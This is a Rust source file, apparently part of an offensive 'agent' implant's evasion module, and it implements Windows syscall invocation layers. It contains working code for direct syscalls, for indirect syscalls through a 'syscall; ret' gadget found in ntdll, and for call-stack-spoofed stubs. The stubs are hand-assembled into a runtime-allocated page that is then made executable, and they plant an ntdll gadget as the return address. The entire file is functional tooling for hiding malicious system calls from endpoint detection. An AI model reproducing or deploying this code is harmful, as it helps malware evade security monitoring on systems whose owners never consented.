// Syscall invocation layers — mirror of Go agent/internal/win/call*.go +
// spoof.go. Provides direct syscall (L4), indirect via ntdll gadget (L5), and
// L7 call-stack spoofed stubs (runtime-built, planting a `call rel32; ret`
// gadget as the return address).

#![cfg(all(target_os = "windows", target_arch = "x86_64"))]

use crate::evasion::pe::*;
use std::collections::HashMap;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Mutex;

// ---- L4: direct syscall ----
// Windows syscall ABI: r10=arg1 rdx=arg2 r8=arg3 r9=arg4, arg5 at [rsp+40].
#[inline]
pub unsafe fn direct_syscall5(ssn: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> usize {
    let ret: usize;
    core::arch::asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "sub rsp, 8",
        "mov [rsp+40], {a5}",
        "syscall",
        "add rsp, 8",
        ssn = in(reg) ssn,
        a5 = in(reg) a5,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        lateout("rax") ret,
        options(nostack, preserves_flags)
    );
    ret
}

// ---- L5: indirect syscall via ntdll "syscall; ret" gadget ----
#[inline]
pub unsafe fn indirect_syscall5(gadget: usize, ssn: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> usize {
    let ret: usize;
    core::arch::asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "sub rsp, 8",
        "mov [rsp+32], {a5}",
        "mov r11, {gadget}",
        "call r11",
        "add rsp, 8",
        ssn = in(reg) ssn,
        a5 = in(reg) a5,
        gadget = in(reg) gadget,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        lateout("rax") ret,
        options(nostack)
    );
    ret
}

// ---- L7: call-stack spoofed stub ----
const SPOOFED_STUB_SIZE: usize = 110;

static SPOOF_PAGE_BASE: AtomicUsize = AtomicUsize::new(0);
static SPOOF_PAGE_OFF: AtomicUsize = AtomicUsize::new(0);
static STUB_CACHE: Mutex<Option<HashMap<u32, usize>>> = Mutex::new(None);
static GADGET_CACHE: AtomicUsize = AtomicUsize::new(0);
static SPOOF_GADGET_CACHE: AtomicUsize = AtomicUsize::new(0);

/// Find a `syscall; ret` (0F 05 C3) gadget in a module.
pub fn find_syscall_gadget(module_base: usize, size: usize) -> usize {
    unsafe {
        let mut off = 0usize;
        while off + 3 <= size {
            let p = module_base + off;
            let b0 = *(p as *const u8);
            let b1 = *((p + 1) as *const u8);
            let b2 = *((p + 2) as *const u8);
            if b0 == 0x0F && b1 == 0x05 && b2 == 0xC3 {
                return p;
            }
            off += 1;
        }
        0
    }
}

/// Find a `call rel32; ret` (E8 xx xx xx xx C3) gadget in ntdll .text.
fn find_spoof_gadget() -> usize {
    let cached = SPOOF_GADGET_CACHE.load(Ordering::SeqCst);
    if cached != 0 {
        return cached;
    }
    unsafe {
        let ntdll = module_ntdll();
        if ntdll == 0 {
            return 0;
        }
        let (nt, _) = match nt_headers_opt(ntdll) {
            Some(v) => v,
            None => return 0,
        };
        let opt_size = (*nt).file_header.size_of_optional_header as usize;
        let sect_base = (nt as usize) + 24 + opt_size;
        let n_sect = (*nt).file_header.number_of_sections as usize;
        for i in 0..n_sect {
            let sh = (sect_base + i * 40) as *const ImageSectionHeader;
            let name = &(*sh).name;
            if &name[..4] != b".tex" {
                continue;
            }
            let start = ntdll + (*sh).virtual_address as usize;
            let vsz = (*sh).virtual_size as usize;
            let mut off = 5usize;
            while off + 1 <= vsz {
                let b0 = *((start + off - 5) as *const u8);
                if b0 == 0xE8 && *((start + off) as *const u8) == 0xC3 {
                    let addr = start + off;
                    SPOOF_GADGET_CACHE.store(addr, Ordering::SeqCst);
                    return addr;
                }
                off += 1;
            }
        }
        0
    }
}

/// Bounds-checked accessor for NT headers.
unsafe fn nt_headers_opt(base: usize) -> Option<(*const ImageNtHeaders64, usize)> {
    if base == 0 {
        return None;
    }
    let dos = base as *const ImageDosHeader;
    if (*dos).e_magic != 0x5A4D {
        return None;
    }
    let nt = (base + (*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    if (*nt).signature != 0x0000_4550 {
        return None;
    }
    Some((nt, (*nt).optional_header.size_of_image as usize))
}

/// Allocate one RW page for spoofed stubs.
fn init_spoof_page() -> usize {
    let cached = SPOOF_PAGE_BASE.load(Ordering::SeqCst);
    if cached != 0 {
        return cached;
    }
    unsafe {
        let base = windows_sys::Win32::System::Memory::VirtualAlloc(
            std::ptr::null(),
            0x1000,
            windows_sys::Win32::System::Memory::MEM_COMMIT
                | windows_sys::Win32::System::Memory::MEM_RESERVE,
            PAGE_READWRITE,
        ) as usize;
        if base != 0 {
            SPOOF_PAGE_BASE.store(base, Ordering::SeqCst);
        }
        base
    }
}

/// Build (and cache) a 110-byte spoofed stub for the given SSN.
pub fn make_spoofed_stub(ssn: usize) -> usize {
    let mut guard = match STUB_CACHE.lock() {
        Ok(g) => g,
        Err(_) => return 0,
    };
    if guard.is_none() {
        *guard = Some(HashMap::new());
    }
    let map = guard.as_mut().unwrap();
    if let Some(a) = map.get(&(ssn as u32)) {
        return *a;
    }
    unsafe {
        let sys_gadget = {
            let g = GADGET_CACHE.load(Ordering::SeqCst);
            if g != 0 {
                g
            } else {
                let ntdll = module_ntdll();
                let (nt, _) = match nt_headers_opt(ntdll) {
                    Some(v) => v,
                    None => return 0,
                };
                let size = (*nt).optional_header.size_of_image as usize;
                let g = find_syscall_gadget(ntdll, size);
                if g != 0 {
                    GADGET_CACHE.store(g, Ordering::SeqCst);
                }
                g
            }
        };
        if sys_gadget == 0 {
            return 0;
        }
        let sg = find_spoof_gadget();
        if sg == 0 {
            return 0;
        }
        let base = init_spoof_page();
        if base == 0 {
            return 0;
        }
        let off = SPOOF_PAGE_OFF.fetch_add(SPOOFED_STUB_SIZE, Ordering::SeqCst);
        if off + SPOOFED_STUB_SIZE > 0x1000 {
            return 0;
        }
        let addr = base + off;
        let mut old = 0u32;
        let _ = windows_sys::Win32::System::Memory::VirtualProtect(
            addr as *mut _,
            SPOOFED_STUB_SIZE,
            PAGE_READWRITE,
            &mut old,
        );
        let s = std::slice::from_raw_parts_mut(addr as *mut u8, SPOOFED_STUB_SIZE);
        s[0] = 0x48; s[1] = 0x83; s[2] = 0xEC; s[3] = 0x08;
        let arg_copies: [(u8, u8); 7] = [
            (0x30, 0x28), (0x38, 0x30), (0x40, 0x38), (0x48, 0x40),
            (0x50, 0x48), (0x58, 0x50), (0x60, 0x58),
        ];
        let mut o = 4usize;
        for (src, dst) in arg_copies {
            s[o+0] = 0x4C; s[o+1] = 0x8B; s[o+2] = 0x5C; s[o+3] = 0x24; s[o+4] = src;
            s[o+5] = 0x4C; s[o+6] = 0x89; s[o+7] = 0x5C; s[o+8] = 0x24; s[o+9] = dst;
            o += 10;
        }
        s[74] = 0x49; s[75] = 0xBB;
        s[76..84].copy_from_slice(&(sg as u64).to_le_bytes());
        s[84] = 0x4C; s[85] = 0x89; s[86] = 0x1C; s[87] = 0x24;
        s[88] = 0x4C; s[89] = 0x8B; s[90] = 0xD1;
        s[91] = 0xB8;
        s[92..96].copy_from_slice(&(ssn as u32).to_le_bytes());
        s[96] = 0xFF; s[97] = 0x25; s[98] = 0; s[99] = 0; s[100] = 0; s[101] = 0;
        s[102..110].copy_from_slice(&(sys_gadget as u64).to_le_bytes());

        let mut old2 = 0u32;
        let _ = windows_sys::Win32::System::Memory::VirtualProtect(
            addr as *mut _,
            SPOOFED_STUB_SIZE,
            PAGE_EXECUTE_READ,
            &mut old2,
        );
        map.insert(ssn as u32, addr);
        addr
    }
}

/// Invoke a spoofed stub (L7). Falls back to indirect/direct when unavailable.
#[inline]
pub unsafe fn spoofed_syscall5(ssn: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> usize {
    let stub = make_spoofed_stub(ssn);
    if stub == 0 {
        let ntdll = module_ntdll();
        let (nt, _) = match nt_headers_opt(ntdll) {
            Some(v) => v,
            None => return 0,
        };
        let gadget = find_syscall_gadget(ntdll, (*nt).optional_header.size_of_image as usize);
        if gadget == 0 {
            return direct_syscall5(ssn, a1, a2, a3, a4, a5);
        }
        return indirect_syscall5(gadget, ssn, a1, a2, a3, a4, a5);
    }
    // Call the stub (x64 ABI: first 4 args in regs, arg5 at [rsp+0x28]).
    let ret: usize;
    core::arch::asm!(
        "sub rsp, 0x30",
        "mov [rsp+0x28], {a5}",
        "call {stub}",
        "add rsp, 0x30",
        stub = in(reg) stub,
        a5 = in(reg) a5,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        lateout("rax") ret,
        options(nostack)
    );
    ret
}
